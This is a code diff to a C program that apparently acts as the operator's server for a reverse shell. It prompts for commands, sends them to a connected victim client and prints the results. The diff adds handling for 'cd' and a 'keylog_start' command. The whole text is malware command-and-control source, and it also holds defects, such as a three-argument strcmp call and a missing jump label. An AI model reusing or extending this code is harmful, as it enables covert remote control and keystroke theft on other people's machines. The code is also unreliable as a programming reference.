@@ -13,7 +13,9 @@
 /// TO BUILD gcc server.c -o server
 
 
-int main() {
+int main()
+ {
+
     int sock, client_sock;
     char buffer[1024];
     char response[18384];
@@ -47,7 +49,7 @@ int main() {
         bzero(&buffer, sizeof(buffer));
         printf("* Shell#%s~$: ", inet_ntoa(client_address.sin_addr)); // print the IP address of the client
 
-        //gets command from stdin and stores it in buffer
+        //gets command from stdin and stores it in buffer (buffer, sizeOf, and the PIPE)
         fgets(buffer, sizeof(buffer), stdin);
 
         // remove the newline character from the buffer, so it doesn't get sent to the client (command will not be recognized with the '/n' character)
@@ -55,13 +57,23 @@ int main() {
 
         write(client_socket, buffer, sizeof(buffer)); // send the command to the client
 
-        // CHECKS COMMANDS FROM CLIENT TO SEE IF THEY ARE QUITTING
+        // CHECKS COMMANDS FROM CLIENT TO SEE IF THEY ARE QUITTING  (compares the string 'q' to the buffer, if true send break
         if(strncmp("q", buffer, 1) == 0) {
             break;
-        } else {
-            recv(client_socket, response, sizeof(response), MSG_WAITALL); // receive the response from the client
+        }
+		else if (strcmp("cd ", buffer, 3) == 0) {
+			goto jump; // go back to jump to prompt for next command. nothig else needed since C
+}
+		else if (strncmp("keylog_start", buffer, 12) == 0 ) {
+			goto jump;
+}
+
+
+// else  receive the response from the client block communication until; MSG_WAITALL--> flag to block operatiion till full request satisfied
+//
+else {
+            recv(client_socket, response, sizeof(response), MSG_WAITALL);
             printf("%s", response); // print the response
         }
     }
-
 }
